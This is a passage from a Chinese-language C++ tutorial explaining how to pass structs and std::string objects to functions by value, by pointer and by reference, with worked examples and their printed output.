&#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：按值接收 Point 结构，并打印其坐标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_point</span><span class="params">(Point p)</span> </span>&#123; <span class="comment">// p 是 pt_main 的副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying Point (inside function): (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 修改副本的值，不会影响原始结构</span></span><br><span class="line">    p.x = <span class="number">100.0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified copy inside function: (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：创建一个新的 Point 结构并按值返回</span></span><br><span class="line"><span class="function">Point <span class="title">create_point</span><span class="params">(<span class="keyword">double</span> x_val, <span class="keyword">double</span> y_val)</span> </span>&#123;</span><br><span class="line">    Point new_p;</span><br><span class="line">    new_p.x = x_val;</span><br><span class="line">    new_p.y = y_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating Point (&quot;</span> &lt;&lt; new_p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; new_p.y &lt;&lt; <span class="string">&quot;) inside create_point.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> new_p; <span class="comment">// 返回 Point 结构的副本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Point pt_main = &#123;<span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling display_point: (&quot;</span> &lt;&lt; pt_main.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_main.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 按值传递 pt_main</span></span><br><span class="line">    display_point(pt_main);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling display_point: (&quot;</span> &lt;&lt; pt_main.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_main.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始结构未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling create_point...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 接收函数返回的 Point 结构副本</span></span><br><span class="line">    Point pt_returned = create_point(<span class="number">5.5</span>, <span class="number">-1.2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Returned Point in main: (&quot;</span> &lt;&lt; pt_returned.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_returned.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Before calling display_point: (3, 4)</span><br><span class="line">Displaying Point (inside function): (3, 4)</span><br><span class="line">Modified copy inside function: (100, 4)</span><br><span class="line">After calling display_point: (3, 4)</span><br><span class="line"></span><br><span class="line">Calling create_point...</span><br><span class="line">Creating Point (5.5, -1.2) inside create_point.</span><br><span class="line">Returned Point in main: (5.5, -1.2)</span><br></pre></td></tr></table></figure><p><strong>按值传递的优缺点:</strong></p><ul><li>  <strong>优点:</strong> 保护原始数据不被函数修改，概念简单。</li><li>  <strong>缺点:</strong> 对于包含大量数据成员的结构，复制整个结构可能效率低下，消耗时间和内存。</li></ul><h3 id="7-6-2-另一个处理结构的函数示例"><a href="#7-6-2-另一个处理结构的函数示例" class="headerlink" title="7.6.2 另一个处理结构的函数示例"></a>7.6.2 另一个处理结构的函数示例</h3><p>假设我们需要一个函数来计算两个点之间的中点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：计算两个 Point 的中点，并返回一个新的 Point</span></span><br><span class="line"><span class="function">Point <span class="title">find_midpoint</span><span class="params">(Point p1, Point p2)</span> </span>&#123;</span><br><span class="line">    Point midpoint;</span><br><span class="line">    midpoint.x = (p1.x + p2.x) / <span class="number">2.0</span>;</span><br><span class="line">    midpoint.y = (p1.y + p2.y) / <span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">return</span> midpoint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数：打印 Point (按值传递)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_point</span><span class="params">(Point p)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Point start_point = &#123;<span class="number">1.0</span>, <span class="number">1.0</span>&#125;;</span><br><span class="line">    Point end_point = &#123;<span class="number">5.0</span>, <span class="number">7.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Start point: &quot;</span>;</span><br><span class="line">    print_point(start_point);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End point: &quot;</span>;</span><br><span class="line">    print_point(end_point);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数计算中点</span></span><br><span class="line">    Point mid = find_midpoint(start_point, end_point);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Midpoint: &quot;</span>;</span><br><span class="line">    print_point(mid); <span class="comment">// 输出: (3, 4)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子再次展示了按值传递结构（<code>p1</code>, <code>p2</code> 是副本）和按值返回结构（<code>midpoint</code> 的副本被返回）。</p><h3 id="7-6-3-传递结构的地址"><a href="#7-6-3-传递结构的地址" class="headerlink" title="7.6.3 传递结构的地址"></a>7.6.3 传递结构的地址</h3><p>为了避免复制整个结构的开销，特别是当结构很大时，或者当需要函数能够修改原始结构时，可以传递结构的<strong>地址</strong>（即指向结构的指针）而不是结构本身。</p><p><strong>方法:</strong></p><ol><li> <strong>函数参数:</strong> 声明为指向结构类型的指针 (<code>struct_type*</code>)。</li><li> <strong>函数调用:</strong> 使用地址运算符 <code>&amp;</code> 获取结构变量的地址传递给函数。</li><li> <strong>访问成员:</strong> 在函数内部，需要使用<strong>间接成员访问运算符 <code>-&gt;</code></strong> (箭头运算符) 来访问指针指向的结构的成员。或者，先解引用指针 <code>*ptr</code>，然后再使用点运算符 <code>.</code>，即 <code>(*ptr).member</code>。<code>ptr-&gt;member</code> 是 <code>(*ptr).member</code> 的简洁写法。</li></ol><p><strong>示例：按指针传递结构</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Rectangle</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> width;</span><br><span class="line">    <span class="keyword">double</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接收指向 Rectangle 的指针，计算面积</span></span><br><span class="line"><span class="comment">// 使用 const 表示函数不会通过指针修改结构内容</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">calculate_area</span><span class="params">(<span class="keyword">const</span> Rectangle* rect_ptr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检查空指针是一种好的防御性编程习惯</span></span><br><span class="line">    <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Null pointer passed to calculate_area.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 使用箭头运算符 -&gt; 访问成员</span></span><br><span class="line">    <span class="keyword">return</span> rect_ptr-&gt;width * rect_ptr-&gt;height;</span><br><span class="line">    <span class="comment">// 或者使用 (*rect_ptr).width * (*rect_ptr).height</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接收指向 Rectangle 的指针，并修改其尺寸 (放大)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_rectangle</span><span class="params">(Rectangle* rect_ptr, <span class="keyword">double</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span> || factor &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Invalid arguments for scale_rectangle.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rect_ptr-&gt;width *= factor;  <span class="comment">// 修改原始结构</span></span><br><span class="line">    rect_ptr-&gt;height *= factor; <span class="comment">// 修改原始结构</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数：打印 Rectangle (按指针传递，使用 const)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_rectangle</span><span class="params">(<span class="keyword">const</span> Rectangle* rect_ptr)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rectangle [Width=&quot;</span> &lt;&lt; rect_ptr-&gt;width &lt;&lt; <span class="string">&quot;, Height=&quot;</span> &lt;&lt; rect_ptr-&gt;height &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Rectangle box = &#123;<span class="number">10.0</span>, <span class="number">5.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original Box: &quot;</span>;</span><br><span class="line">    print_rectangle(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传递 box 的地址给 calculate_area</span></span><br><span class="line">    <span class="keyword">double</span> area = calculate_area(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; area &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 50</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传递 box 的地址给 scale_rectangle 以修改它</span></span><br><span class="line">    scale_rectangle(&amp;box, <span class="number">2.0</span>); <span class="comment">// 放大两倍</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scaled Box: &quot;</span>;</span><br><span class="line">    print_rectangle(&amp;box); <span class="comment">// 打印修改后的原始 box</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Rectangle [Width=20, Height=10]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重新计算面积</span></span><br><span class="line">    area = calculate_area(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Area: &quot;</span> &lt;&lt; area &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>按指针传递的优缺点:</strong></p><ul><li><strong>优点:</strong><ul><li>  效率高，只传递地址，不复制整个结构。</li><li>  允许函数修改原始结构数据。</li></ul></li><li><strong>缺点:</strong><ul><li>  语法稍复杂（需要使用 <code>&amp;</code> 获取地址，使用 <code>-&gt;</code> 或 <code>(*).</code> 访问成员）。</li><li>  可能意外修改原始数据（除非使用 <code>const</code>）。</li><li>  需要处理空指针的可能性。</li></ul></li></ul><p><strong>按引用传递 (Pass by Reference):</strong></p><p>C++ 还提供了另一种避免复制并允许修改原始数据的方式：<strong>按引用传递</strong>。这将在第 8 章详细介绍。按引用传递通常比按指针传递更简洁、更安全（因为它通常不涉及空引用的概念）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：按引用传递 (将在第 8 章详细讲解)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Circle</span> &#123;</span> <span class="keyword">double</span> radius; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是 Circle 的引用 (别名)</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">circle_area_ref</span><span class="params">(<span class="keyword">const</span> Circle&amp; c)</span> </span>&#123; <span class="comment">// 使用 const 引用避免复制且不修改</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3.14159</span> * c.radius * c.radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_circle_ref</span><span class="params">(Circle&amp; c, <span class="keyword">double</span> factor)</span> </span>&#123; <span class="comment">// 使用非 const 引用允许修改</span></span><br><span class="line">    <span class="keyword">if</span> (factor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        c.radius *= factor; <span class="comment">// 直接用 . 访问成员，修改原始对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Circle circ = &#123;<span class="number">5.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; circle_area_ref(circ) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    scale_circle_ref(circ, <span class="number">3.0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Radius: &quot;</span> &lt;&lt; circ.radius &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Area: &quot;</span> &lt;&lt; circle_area_ref(circ) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  结构默认按值传递给函数（创建副本）。</li><li>  函数可以按值返回结构（返回副本）。</li><li>  为提高效率或允许修改原始结构，可以传递结构的地址（指针 <code>struct_type*</code>），使用 <code>-&gt;</code> 访问成员。</li><li>  使用 <code>const</code> 配合指针（或引用）可以防止函数意外修改结构。</li><li>  按引用传递 (<code>struct_type&amp;</code>) 是另一种常用的高效传递方式，通常更受欢迎。</li></ul><h2 id="7-7-函数和-string-对象"><a href="#7-7-函数和-string-对象" class="headerlink" title="7.7 函数和 string 对象"></a>7.7 函数和 string 对象</h2><p>C++ 标准库提供的 <code>std::string</code> 类是处理字符串的现代、更安全、更方便的方式，它与 C-风格字符串（字符数组）有很大不同。将 <code>std::string</code> 对象传递给函数或从函数返回它们，其行为更像结构体，但也受益于 C++ 的引用特性。</p><h3 id="传递-std-string-对象"><a href="#传递-std-string-对象" class="headerlink" title="传递 std::string 对象"></a>传递 <code>std::string</code> 对象</h3><p>与结构类似，<code>std::string</code> 对象默认也是<strong>按值传递 (Pass by Value)**。这意味着当将一个 <code>string</code> 对象传递给函数时，会创建该对象的一个</strong>副本**。</p><p><strong>示例：按值传递 <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 包含 string 头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按值接收 string 对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_string_value</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> str)</span> </span>&#123; <span class="comment">// str 是 message 的副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (value): \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 修改副本，不影响原始 string</span></span><br><span class="line">    str[<span class="number">0</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified copy inside function: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_string_value(message);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 string 未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello&quot;</span><br><span class="line">Inside function (value): &quot;Hello&quot;</span><br><span class="line">Modified copy inside function: &quot;Jello&quot;</span><br><span class="line">After call: &quot;Hello&quot;</span><br></pre></td></tr></table></figure><p><strong>按值传递 <code>std::string</code> 的问题:</strong></p><p>虽然按值传递可以保护原始数据，但 <code>std::string</code> 对象可能存储很长的字符串。每次调用函数都复制整个字符串（包括其内部可能动态分配的内存）可能会导致显著的性能开销。</p><h3 id="按引用传递-std-string"><a href="#按引用传递-std-string" class="headerlink" title="按引用传递 std::string"></a>按引用传递 <code>std::string</code></h3><p>为了避免复制开销并允许函数修改原始 <code>string</code> 对象，可以使用**按引用传递 (Pass by Reference)**。</p><p><strong>示例：按引用传递 <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按引用接收 string 对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_string_ref</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>&amp; str_ref)</span> </span>&#123; <span class="comment">// str_ref 是 message 的别名</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (reference): \&quot;&quot;</span> &lt;&lt; str_ref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 修改引用，会直接修改原始 string</span></span><br><span class="line">    str_ref += <span class="string">&quot; World&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified original via reference: \&quot;&quot;</span> &lt;&lt; str_ref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    modify_string_ref(message); <span class="comment">// 传递引用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 string 已被修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello&quot;</span><br><span class="line">Inside function (reference): &quot;Hello&quot;</span><br><span class="line">Modified original via reference: &quot;Hello World&quot;</span><br><span class="line">After call: &quot;Hello World&quot;</span><br></pre></td></tr></table></figure><h3 id="按常量引用传递-std-string-推荐方式"><a href="#按常量引用传递-std-string-推荐方式" class="headerlink" title="按常量引用传递 std::string (推荐方式)"></a>按常量引用传递 <code>std::string</code> (推荐方式)</h3><p>如果函数需要读取 <code>string</code> 的内容但不需要修改它，最佳实践是使用**按常量引用传递 (Pass by 